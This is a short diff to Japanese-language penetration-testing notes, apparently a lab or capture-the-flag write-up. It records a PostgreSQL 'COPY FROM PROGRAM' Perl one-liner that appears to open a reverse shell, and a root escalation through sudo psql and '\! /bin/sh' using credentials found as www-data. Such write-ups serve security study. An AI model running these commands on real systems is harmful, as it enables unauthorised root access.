@@ -126,4 +126,13 @@ COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket
 psql
 \! /bin/sh
 ```
-``
+```sh
+# 実際に実行したコマンド
+sudo psql -h 127.0.0.1 -U postgres
+password for user postgres: # ← www-dataで発見した認証情報
+\! /bin/sh
+# whoami
+root
+```
+
+-
